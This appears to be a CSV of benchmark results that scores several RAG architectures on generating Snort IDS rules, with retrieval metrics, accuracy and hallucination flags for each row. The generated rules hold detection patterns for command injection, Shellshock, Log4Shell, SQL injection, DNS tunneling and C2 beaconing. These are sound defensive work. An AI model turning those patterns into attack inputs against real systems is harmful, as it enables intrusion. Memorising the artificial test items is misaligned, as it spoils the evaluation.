query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_019,agentic_rag,Rule for command injection on the network.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0144,SNORT_0144;SNORT_0127;SNORT_0059;SNORT_0093;SNORT_0110,Web_Attack,Web_Attack,Command Injection,Command Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible HTTP command injection""; flow:to_server,established; pcre:""/(;|\||&&)(whoami|id|cat)/Ui""; classtype:web-application-attack; sid:1000144; rev:1;)"
Q_020,baseline,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,1.0,SNORT_0062,,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)"
Q_020,rag_classic,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,rag_rerank,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0113;SNORT_0045;SNORT_0062;SNORT_0011;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
Q_020,rag_hybrid,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,multi_hop,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0062;SNORT_0113;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_020,graph_rag,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0113;SNORT_0011;SNORT_0045;SNORT_0062;SNORT_0028,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
Q_020,agentic_rag,Generate a Snort rule to detect periodic HTTP beaconing using an old suspicious User-Agent header.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0062,SNORT_0045;SNORT_0113;SNORT_0062;SNORT_0011;SNORT_0130,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_021,baseline,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0152,,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000016; rev:1;)"
Q_021,rag_classic,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,rag_rerank,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,rag_hybrid,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0117,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,multi_hop,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,graph_rag,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8181818181818182,0.0,SNORT_0152,SNORT_0033;SNORT_0135;SNORT_0101;SNORT_0152;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_021,agentic_rag,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0117,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_022,baseline,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0039,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_022,rag_classic,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0039,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0141;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_022,rag_rerank,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,rag_hybrid,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,multi_hop,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0124;SNORT_0056;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,graph_rag,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0124;SNORT_0141;SNORT_0073;SNORT_0005,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,agentic_rag,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_023,baseline,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0134,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_classic,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0032;SNORT_0049;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_rerank,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0032;SNORT_0049;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_hybrid,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,multi_hop,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0100;SNORT_0117;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,graph_rag,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0083,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,agentic_rag,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_024,baseline,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,1.0,SNORT_0115,,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000030; rev:1;)"
Q_024,rag_classic,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,rag_rerank,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,rag_hybrid,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,multi_hop,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,graph_rag,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0013,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,agentic_rag,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_025,baseline,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.3076923076923077,1.0,SNORT_0045,,Web_Attack,Malware_C2,Directory Traversal,HTTP C2 Beacon,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000007; rev:1;)"
Q_025,rag_classic,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,rag_rerank,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,rag_hybrid,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0062;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,multi_hop,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,graph_rag,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0045,SNORT_0113;SNORT_0011;SNORT_0045;SNORT_0028;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
